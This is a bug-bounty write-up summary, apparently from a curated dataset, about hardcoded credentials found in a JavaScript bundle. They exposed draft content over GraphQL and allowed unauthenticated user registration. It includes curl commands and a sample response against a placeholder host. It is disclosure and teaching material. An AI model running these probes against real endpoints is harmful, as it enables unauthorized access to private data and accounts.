---
id: abb2fb59c85d
title: "A Couple's Hunt: Hardcoded Credentials Lead to Internal Data Exposure & a $300 Bounty"
source_url: https://medium.com/@mhrdkaa._/a-couples-hunt-hardcoded-credentials-lead-to-internal-data-exposure-a-300-bounty-933db89ac98c
author: "Utaa"
publication_date: 2026-08-11
category: api-security
category_label: "API Security"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "bug-bounty"
  - "bug-bounty-writeup"
tools:
  - "curl"
quick_test: "Inspect JavaScript bundles for hardcoded credentials and test GraphQL endpoints with found tokens and headers."
---

## Use case

The application exposed internal draft content and sensitive data due to hardcoded credentials and misconfigured GraphQL permissions, allowing unauthorized access to confidential information.

## Steps to test

1. Analyze the JavaScript bundle for hardcoded credentials and sensitive headers.
2. Use the found token and headers to make a request to the GraphQL endpoint.
3. Perform a GraphQL query to access draft content using the x-include-drafts header.
4. Test the registration mutation to create a new user account without authentication.

## Commands

```text
curl -s -X POST "https://cms.target.com/graphql" \
-H "Authorization: Bearer <TOKEN>" \
-H "Content-Type: application/json" \
-H "x-include-drafts: true" \
-d '{"query":"{ caseStudies { data { id attributes { title slug publishedAt } } } }"}'
-d '{"query":"mutation { register(input: { username: \"poc-hacker\", email: \"hacker@poc.com\", password: \"Password123!\" }) { jwt user { id username email } } }"}'
curl -s -X POST "https://cms.target.com/graphql" \
-H "Authorization: Bearer <TOKEN>" \
-H "Content-Type: application/json" \
-H "x-include-drafts: true" \
-d '{"query":"{ caseStudies { data { id attributes { title slug publishedAt } } } }"}'
{
"data": {
"caseStudies": [
{
"data": {
"attributes": {
"title": "example",
"slug": "example",
"publishedAt": null
}
}
}
]
}
}
curl -s -X POST "https://cms.target.com/graphql" \
-H "Content-Type: application/json" \
-d '{"query":"mutation { register(input: { username: \"poc-hacker\", email: \"hacker@poc.com\", password: \"Password123!\" }) { jwt user { id username email } } }"}'
```

## Source

- Author: Utaa
- Writeup: https://medium.com/@mhrdkaa._/a-couples-hunt-hardcoded-credentials-lead-to-internal-data-exposure-a-300-bounty-933db89ac98c

_For authorized testing only. Credit the original author._
